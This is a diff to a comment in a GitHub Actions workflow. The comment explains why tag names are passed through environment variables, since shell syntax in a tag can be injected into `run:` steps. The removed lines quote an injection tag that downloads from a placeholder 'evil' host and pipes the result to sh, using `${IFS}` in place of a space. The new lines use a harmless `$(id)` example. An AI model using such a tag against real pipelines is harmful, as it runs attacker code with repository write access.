@@ -113,12 +113,10 @@ jobs:
       # `TAG_NAME`/`REPO` go through `env:`, never spliced into `run:` directly.
       # A git tag name may legally contain `$()`, backticks, `;` and `"` — Actions
       # substitutes `${{ github.ref_name }}` into this YAML's text before bash
-      # ever parses it, so a tag like `v1.0.0$(curl${IFS}evil|sh)` (a real,
-      # `git check-ref-format --allow-onelevel`-accepted one-level ref — a
-      # literal space is the one shell-relevant character git actually forbids,
-      # so `${IFS}` stands in for it; `v1.0.0$(curl evil|sh)`, with a literal
-      # space, is NOT a valid ref and was wrongly cited as one in an earlier
-      # revision of this comment) would have run arbitrary code in a step
+      # ever parses it, so a tag like `v1.0.0$(id)` (a real,
+      # `git check-ref-format --allow-onelevel`-accepted one-level ref —
+      # confirmed valid with `git check-ref-format --allow-onelevel 'v1.0.0$(id)'`)
+      # would have run arbitrary code in a step
       # holding a `contents: write` GH_TOKEN, had the expression been quoted
       # straight into the shell string instead. An environment variable's
       # *value* is never re-parsed for shell syntax, so `"$TAG_NAME"` is safe
